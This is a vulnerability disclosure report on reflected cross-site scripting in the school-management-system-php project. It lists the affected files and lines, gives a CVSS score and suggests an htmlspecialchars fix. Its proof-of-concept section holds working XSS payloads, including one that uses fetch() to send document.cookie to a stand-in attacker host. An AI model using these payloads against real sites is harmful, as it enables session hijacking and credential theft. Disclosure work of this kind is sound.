# Vulnerability Report

## Summary
- **Title**: Multiple Reflected XSS in school-management-system-php
- **Affected Version**: all versions (as of 2026-06-28)
- **CWE**: CWE-79 - Cross-site Scripting (Reflected)
- **CVSS 3.1 Score**: 6.1 Medium (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)
- **Vendor**: codingWithElias
- **Product**: school-management-system-php
- **Repository**: https://github.com/codingWithElias/school-management-system-php

## Description

school-management-system-php contains multiple reflected XSS vulnerabilities. The `$_GET['error']` and `$_GET['success']` parameters are echoed directly into HTML using `<?= ?>` (short echo) without any `htmlspecialchars()` encoding.

### Affected files and lines:
- `login.php` line 25: `<?=$_GET['error']?>`
- `index.php` line 80: `<?=$_GET['error']?>`
- `index.php` line 85: `<?=$_GET['success']?>`
- `Teacher/student-grade.php` lines 83, 88
- `admin/course.php` lines 37, 44

### PoC

```
login.php?error=<script>alert(document.cookie)</script>
index.php?error=<img src=x onerror=alert(1)>
index.php?success=<script>fetch('https://attacker.com/?c='+document.cookie)</script>
```

## Impact

An attacker can craft a malicious URL that executes arbitrary JavaScript in the victim's browser, enabling session hijacking and credential theft.

## Suggested Fix

```diff
- <?=$_GET['error']?>
+ <?=htmlspecialchars($_GET['error'], ENT_QUOTES, 'UTF-8')?>
```

## Credit
- Discovered by: goutou (https://github.com/goutouanquan)
- Contact: goutouanquan@163.com
